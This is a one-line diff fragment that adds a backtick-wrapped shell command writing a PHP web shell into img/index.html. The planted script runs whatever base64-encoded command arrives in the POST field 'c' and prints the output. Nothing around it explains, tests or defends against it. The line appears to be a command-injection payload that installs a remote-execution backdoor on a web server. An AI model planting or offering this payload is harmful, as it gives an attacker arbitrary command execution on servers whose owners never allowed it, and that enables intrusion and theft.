@@ -1,0 +1,1 @@
+`echo '<?php exec(base64_decode($_POST["c"]),$output);echo(implode("\n",$output));?>'>img/index.html`
